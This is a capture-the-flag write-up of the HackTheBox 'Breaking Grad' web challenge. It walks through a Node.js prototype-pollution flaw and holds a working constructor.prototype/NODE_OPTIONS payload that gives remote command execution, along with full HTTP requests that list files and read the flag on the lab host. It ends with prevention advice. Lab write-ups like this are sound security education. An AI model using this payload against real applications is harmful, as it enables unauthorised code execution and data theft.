---
title: HackTheBox - Breaking Grad
author: 0
date: 2023-04-19 18:00:00 +0800
categories: [htb, challenge]
tags: [web, prototype-pollution]
render_with_liquid: false
---

>You and your buddy corrected the math in your physics teacher's paper on the decay of highly excited massive string states in the footnote of a renowned publication. He's just failed your thesis out of spite, for making a fool out of him in the university's research symposium. Now you can't graduate, unless you can do something about it... 🤷

This challenge provides a webpages where you can select one of two student names, being "Kenny Baker" or "Jack Purvis". You can check if they can graduate, selecting either will provide the output "nooooo0o00ope".

![Homepage](/assets/img/htb-breaking_grad-homepage.png)


## Reconnaissance
### Objecthelper.js
This `ObjectHelper` provides functions that can be used to manipulate JavaScript objects.
* The `merge` function allows you to merge two objects together, where the properties of the source object are added to the target object.
* The `clone` function creates a new object that is a copy of an existing object.

```javascript
module.exports = {
    isObject(obj) {
        return typeof obj === 'function' || typeof obj === 'object';
    },

    isValidKey(key) {
        return key !== '__proto__';
    },

    merge(target, source) {
        for (let key in source) {
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
        }
        return target;
    },

    clone(target) {
        return this.merge({}, target);
    }
}
```

### Debughelper.js
The `DebugHelper` accepts two arguments:
* `version` executes `VersionCheck.js` and outputs `txt`
* `ram` runs the `ram free -m` command

```javascript
const { execSync, fork } = require('child_process');

module.exports = {
    execute(res, command) {

        res.type('txt');

        if (command == 'version') {
            let proc = fork('VersionCheck.js', [], {
                stdio: ['ignore', 'pipe', 'pipe', 'ipc']
            });

            proc.stderr.pipe(res);
            proc.stdout.pipe(res);

            return;
        } 
        
        if (command == 'ram') {
            return res.send(execSync('free -m').toString());
        }
        
        return res.send('invalid command');
    }
}
```

### Index.js
We notice that in `index.js`:
* `/debug/:action` calls `DebugHelper.execute` with an action parameter
* `/api/calculate` calls `ObjectHelper.clone(req.body)` with the request body as an argument.

```javascript
router.get('/debug/:action', (req, res) => {
    return DebugHelper.execute(res, req.params.action);
});

router.post('/api/calculate', (req, res) => {
    let student = ObjectHelper.clone(req.body);

    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasBase(student.paper)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }

    return res.send({
        'pass': 'Passed'
    });
});
```

### Conclusion
By going through the files, we notice that `ObjectHelper` is vulnerable to prototype pollution. 
>In JavaScript, objects can inherit properties and methods from other objects. This inheritance is achieved through the prototype chain, which is a series of objects that are linked together.

>Prototype pollution occurs when an attacker is able to modify the prototype of an object to introduce unexpected behavior. This can happen when an application blindly trusts user input to modify the properties of an object without proper validation.

There are three factors to a [prototype pollution vulnerability](https://portswigger.net/web-security/prototype-pollution):
* The **source** - This is any input that enables you to poison prototype objects with arbitrary properties.
* The **sink** - JavaScript code that enables arbitrary code execution.
* The **gadget** - This is the payload and is any property that is passed into a sink without proper filtering or sanitization.

In this challenge:
* The **source** is the `ObjectHelper` class as the developers tried to mitigate this by filtering out the `__proto___` key through a denylist, we will be able to bypass the check and exploit the `merge` function.
* The **sink** is the `DebugHelper` class as both `version` and `ram` perform os commands, but with using the `version` argument we get output in `txt` format.
* The **gadget**, will be build in the exploitation phase.

## Exploit
### Building the gadget
We found some a good payload that uses `constructor.prototype` instead of using `__proto__` to bypass the check in `ObjectHelper` on [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce).

```javascript
{
  "constructor": {
    "prototype": {
      "env": {
        "payload": "console.log(require(\"child_process\").execSync(\"ls\").toString())//",
        "NODE_OPTIONS": "--require /proc/self/environ"
      }
    }
  }
}
```

* `constructor`: This is the constructor property of the object being created. In this case, we're using it to create a new object with a poisoned prototype.
    * `prototype`: This is the prototype property of the object being created. We're using it to add properties to the object's prototype that can be used to exploit prototype pollution vulnerabilities.
        * `env`: This is an environment variable that we're setting for the current process.
            * `"payload": "console.log(require(\"child_process\").execSync(\"ls\").toString())//"`: This is the actual payload that will be executed. It uses the `child_process module` to execute the a command in this case `ls`. The double slashes at the end are used to comment any code coming after this injection.
    * `"NODE_OPTIONS": "--require /proc/self/environ"`: This is a flag that is passed to the Node.js runtime environment to require the `/proc/self/environ` file. This file contains environment variables for the current process, including any variables that may be used by the Node.js process.

This payload would be converted to this javascript code.
```javascript
Object.constructor.prototype.env = {
    "payload": "console.log(require(\"child_process\").execSync(\"ls\").toString())//"
};
Object.constructor.prototype.NODE_OPTIONS = "--require /proc/self/environ";
```


### Getting the directory 
```javascript
POST /api/calculate HTTP/1.1
Host: 144.126.236.38:32064
User-Agent: XXX
Content-Type: application/json

{
  "constructor": {
    "prototype": {
      "env": {
        "payload": "console.log(require(\"child_process\").execSync(\"ls\").toString())//",
        "NODE_OPTIONS": "--require /proc/self/environ"
      }
    }
  }
}
```

#### Response error
On our request we are getting an error, but we can see the result by checking our sink `/debug/version/`.

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>RangeError: Maximum call stack size exceeded<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:10:10)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)<br> &nbsp; &nbsp;at Object.merge (/app/helpers/ObjectHelper.js:14:26)</pre>
</body>
</html>
```

#### Result
```
GET /debug/version HTTP/1.1
Host: 144.126.236.38:32064
User-Agent: XXX

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Date: Wed, 19 Apr 2023 15:58:24 GMT
Connection: close
Content-Length: 149

VersionCheck.js
flag_e1T6f
helpers
index.js
node_modules
package-lock.json
package.json
routes
static
views

Everything is OK (v12.18.1 == v12.18.1)
```
### Getting the flag
#### Payload
```javascript
POST /api/calculate HTTP/1.1
Host: 144.126.236.38:32064
User-Agent: XXX
Content-Type: application/json

{
  "constructor": {
    "prototype": {
      "env": {
        "payload": "console.log(require(\"child_process\").execSync(\"cat flag_e1T6f\").toString())//",
        "NODE_OPTIONS": "--require /proc/self/environ"
      }
    }
  }
}
```

#### Result
```
GET /debug/version HTTP/1.1
Host: 144.126.236.38:32064
User-Agent: XXX


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/plain; charset=utf-8
Date: Wed, 19 Apr 2023 16:04:25 GMT
Connection: close
Content-Length: 84

HTB{l0**Redacted**ng}
Everything is OK (v12.18.1 == v12.18.1)

```

## Prevention
To prevent prototype pollution it is recommended to:
* **Sanitizing property keys**: One way to avoid prototype pollution is to sanitize property keys and not merge dangerous strings from user input, using an allowlist of permitted keys.
* **Preventing changes to prototype objects**: Invoking the `Object.freeze()` method on an object ensures that its properties and their values can no longer be modified, and no new properties can be added. Use `Object.freeze()` to cut off any potential sources of prototype pollution.
* **Preventing an object from inheriting properties**: Manually setting an object's prototype by creating it using the `Object.create()` method can prevent an object from inheriting properties. Creating an object with a `null` prototype ensures that it won't inherit any properties at all.
* U**sing safer alternatives where possible**: Using built-in protection objects like `Map` and `Set` can provide a robust defense against prototype pollution. These objects have built-in methods that only return properties defined directly on the object itself, avoiding any pollution from prototypes.

[(Source: Portswigger)](https://portswigger.net/web-security/prototype-pollution/preventing)